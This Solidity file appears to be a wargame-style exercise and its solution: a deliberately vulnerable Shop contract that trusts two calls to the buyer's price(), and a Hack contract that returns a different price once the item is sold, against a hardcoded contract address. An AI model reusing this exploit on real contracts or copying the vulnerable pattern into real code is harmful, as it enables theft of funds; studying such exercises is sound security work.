// SPDX-License-Identifier: MIT

// the goal of this contract is to buy items for less than they cost
// understand restrictions of view functions
// may involve interface manipulation
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
contract Hack is Buyer{
    function price() override external view returns (uint){
        address _target = 0x5715CEe19587Ae626Fb1487c3258040D4422656e;
        return Shop(_target).isSold() ? 0 : 100;
        
    }
    function buy(address _target) public {
        Shop(_target).buy();
    }
}